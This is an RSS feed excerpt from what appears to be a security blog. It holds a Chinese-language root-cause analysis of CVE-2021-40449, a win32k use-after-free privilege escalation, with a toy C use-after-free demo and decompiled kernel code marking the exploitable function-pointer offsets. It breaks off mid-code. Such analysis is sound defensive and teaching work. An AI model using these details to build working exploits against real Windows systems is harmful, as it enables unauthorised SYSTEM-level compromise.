<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>vulneribility analysis on chestnut's blog</title><link>https://www.ch35tnut.site/en/vulnerability/</link><description>Recent content in vulneribility analysis on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 08 Sep 2021 21:49:43 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/en/vulnerability/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2021-40449 win32k 权限提升漏洞分析</title><link>https://www.ch35tnut.site/en/vulnerability/cve-2021-40449-win32k-eop/</link><pubDate>Tue, 09 Nov 2021 15:16:28 +0800</pubDate><guid>https://www.ch35tnut.site/en/vulnerability/cve-2021-40449-win32k-eop/</guid><description>&lt;h2 id="cve-2021-40449-win32k提权漏洞及poc分析">CVE-2021-40449 Win32k提权漏洞及POC分析&lt;/h2>
&lt;h3 id="背景">背景&lt;/h3>
&lt;p>CVE-2021-40449是卡巴斯基实验室在2021年8月下旬到9月上旬在Windows服务器上捕获的恶意样本利用的提权漏洞，该漏洞存在于win32kfull.sys驱动内，利用该漏洞可以在windows中完成从users到system的权限提升。&lt;/p>
&lt;h4 id="基本概念">基本概念&lt;/h4>
&lt;p>
&lt;img alt="aaa" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110112401943.png" />&lt;/p>
&lt;p>&lt;strong>内核对象&lt;/strong>：内核对象即在内核空间存在的对象，只能由内核分配，内核访问。&lt;/p>
&lt;p>&lt;strong>内核对象的引用计数&lt;/strong>：在操作系统中，可能有多个进程访问同一个内核对象，如果没有进程需要使用该对象内核就应该释放该对象，所以为了准确的释放该对象就有了引用计数。当内核对象被创建时，引用计数被标记为1，调用CloseHandle()时内核对象的引用计数就-1，这可以类比Java GC的引用计数法：&lt;/p>
&lt;blockquote>
&lt;p>在对象中添加一个引用计数器，每当一个地方引用它时，计数器就加一；当引用失效时，计数器值就减一；任何时刻计数器为零的对象就是不可能再被使用的。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>句柄&lt;/strong>：由于内核对象只能由内核分配、访问、修改，当ring 3层的应用程序想要操作这些内核对象的时候，并不能直接操控内核对象。当内核对象创建好后，操作系统会使用一个句柄来标识该对象并返回给应用程序，应用程序通过操作系统提供的ring 3层API来操作句柄，ring3层API经过系统调用进入内核。在内核处句柄对应着具体的内核对象，这样ring3层的应用程序就可以通过操作句柄来间接操作内核对象。&lt;/p>
&lt;p>&lt;strong>句柄表&lt;/strong>：当一个进程初始化的时候，系统会给该进程分配一个句柄表，当进程创建内核对象的时候，内核创建对应内核对象，并遍历该进程的句柄表，在句柄表的空闲位置设置内核对象、对象指针等，并获取该位置的索引，作为进程创建对象的函数的返回值，即为句柄。&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.cnblogs.com/MisterXu/p/10846918.html" target="_blank">https://www.cnblogs.com/MisterXu/p/10846918.html&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>DC&lt;/strong>：是一个内核对象，全称device context，设备上下文对象&lt;/p>
&lt;p>&lt;strong>HDC&lt;/strong>：DC对象的句柄。&lt;/p>
&lt;p>&lt;strong>释放后重用&lt;/strong>：指一个内存空间被操作系统释放后，内存空间变为空闲状态，如果用户在这一刻申请内存，操作系统会优先分配刚释放的内存，则用户大概率可以申请到刚刚释放的内存并修改该内存空间的内容。如果在释放空间之前有指针指向该空间，在释放空间之后指针并未按照理想状态置为NULL，由于释放后可以重新申请该内存并修改内存内容，后续如果继续使用该指针，但内存内内容并不是预期的释放之前的内容，则会产生非预期行为。&lt;/p>
&lt;p>eg：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">badMethod&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 定义函数指针
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#a6e22e">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>function)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>class test {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> function p;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">test&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// new test对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> test &lt;span style="color:#f92672">*&lt;/span>t &lt;span style="color:#f92672">=&lt;/span> new &lt;span style="color:#a6e22e">test&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> test &lt;span style="color:#f92672">*&lt;/span>p &lt;span style="color:#f92672">=&lt;/span> t;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">-&amp;gt;&lt;/span>p &lt;span style="color:#f92672">=&lt;/span> method;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">p&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 释放t指向的test对象的空间
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> delete t;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> test &lt;span style="color:#f92672">*&lt;/span>pt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">size_t&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">10000&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 占用刚释放的对象的内存空间
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> pt &lt;span style="color:#f92672">=&lt;/span> (test &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#a6e22e">malloc&lt;/span>(&lt;span style="color:#66d9ef">sizeof&lt;/span>(test));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将申请的空间当作test对象，并将对象的函数指针设置为恶意函数地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> pt&lt;span style="color:#f92672">-&amp;gt;&lt;/span>p &lt;span style="color:#f92672">=&lt;/span> badMethod;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这里原意想要调用method函数，但是实际调用了badMethod函数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;第二次调用&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">p&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;method&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">badMethod&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;bad method&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="image-20211111123430653" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211111123430653.png" />&lt;/p>
&lt;h4 id="漏洞形成分析">漏洞形成分析&lt;/h4>
&lt;p>该漏洞产生于&lt;strong>win32kfull!GreResetDCInternal&lt;/strong>函数中，该函数内会获取DC对象内的函数指针，并执行该函数指针指向的函数，但并未检查DC对象是否异常。所以如果可以在调用函数指针之前释放DC对象，并重新申请该对象的内存空间，通过构造内存布局，修改原DC对象的函数指针指向其他任意内核函数，就可以在win32kfull!GreResetDCInternal内实现&lt;strong>任意内核函数调用&lt;/strong>。&lt;/p>
&lt;p>根据代码，我们可以算出DCO对象和DC对象的函数指针的关系：function pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针&lt;/p>
&lt;blockquote>
&lt;p>v10 = *(_QWORD *)(v8 + 48);&lt;/p>
&lt;p>v15 *= * (void (_fastcall * * )(QWORD, _QWORD))(*v10 + 2768);&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> __usercall GreResetDCInternal&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rax&lt;span style="color:#f92672">&amp;gt;&lt;/span>(HDC a1&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rcx&lt;span style="color:#f92672">&amp;gt;&lt;/span>, &lt;span style="color:#66d9ef">__int64&lt;/span> a2&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rdx&lt;span style="color:#f92672">&amp;gt;&lt;/span>, &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a3&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>r8&lt;span style="color:#f92672">&amp;gt;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> v24; &lt;span style="color:#75715e">// [rsp+50h] [rbp-20h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v25; &lt;span style="color:#75715e">// [rsp+60h] [rbp-10h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DCOBJ&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">DCOBJ&lt;/span>((DCOBJ &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v25, a1); &lt;span style="color:#75715e">// 利用构造函数从HDC创建DCOBJ对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> v8 &lt;span style="color:#f92672">=&lt;/span> v25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">··········&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span>); &lt;span style="color:#75715e">// 赋值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1736&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> v11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">512&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">120&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> (HDC)&lt;span style="color:#a6e22e">hdcOpenDCW&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>qword_1C0141EB0, v26, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>));&lt;span style="color:#75715e">// 创建新的DC对象，返回对应的HDC句柄
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ( v13 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCOBJ&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">DCOBJ&lt;/span>((DCOBJ &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v24, v13);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> (_QWORD &lt;span style="color:#f92672">*&lt;/span>)v24;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v24 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v12 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">120&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">116&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">308&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">309&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(_QWORD, _QWORD))(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2768&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v15 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">v15&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>), &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v14[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>i64));&lt;span style="color:#75715e">// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">HmgSwapLockedHandleContents&lt;/span>(v3, &lt;span style="color:#ae81ff">0&lt;/span>i64, v6, &lt;span style="color:#ae81ff">0&lt;/span>i64, v23);&lt;span style="color:#75715e">// 交换旧的和新的HDC对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">GreReleaseHmgrSemaphore&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">bDeleteDCInternal&lt;/span>(v6, &lt;span style="color:#ae81ff">1&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64); &lt;span style="color:#75715e">// 传入了hdcOpenDCW返回的HDC，但HmgSwapLockedHandleContents交换了新旧句柄对应的DC对象，此时v6句柄对应旧DC对象。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">······&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>调用该函数指针的时候，所用的两个参数也是源于用户传入的HDC句柄对应的DC对象。&lt;/p>
&lt;blockquote>
&lt;p>v10 = *(_QWORD *)(v8 + 48); _&lt;/p>
&lt;p>_v14[308] = *(_QWORD *)(v25 + 2464);&lt;/p>
&lt;p>v14[309] = *(_QWORD *)(v25 + 2472);&lt;/p>
&lt;p>v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));&lt;/p>
&lt;/blockquote>
&lt;p>在win32kfull!GreResetDCInternal函数的后半段会调用win32kbase!DeleteDCInternal函数释放传入该函数的HDC句柄所对应的DC对象，到这里就达成了use-after-free的&lt;strong>free步骤&lt;/strong>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>HDC v3;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v3&lt;span style="color:#f92672">=&lt;/span>a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> (HDC)&lt;span style="color:#a6e22e">hdcOpenDCW&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>qword_1C0141EB0, v26, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>));&lt;span style="color:#75715e">// 创建新的HDC
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> v6 &lt;span style="color:#f92672">=&lt;/span> v13;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v13 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCOBJ&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">DCOBJ&lt;/span>((DCOBJ &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v24, v13);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> (_QWORD &lt;span style="color:#f92672">*&lt;/span>)v24;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v24 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v12 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">120&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">116&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">308&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">309&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(_QWORD, _QWORD))(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2768&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v15 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">v15&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>), &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v14[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>i64));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">GreAcquireHmgrSemaphore&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">LOBYTE&lt;/span>(v23) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
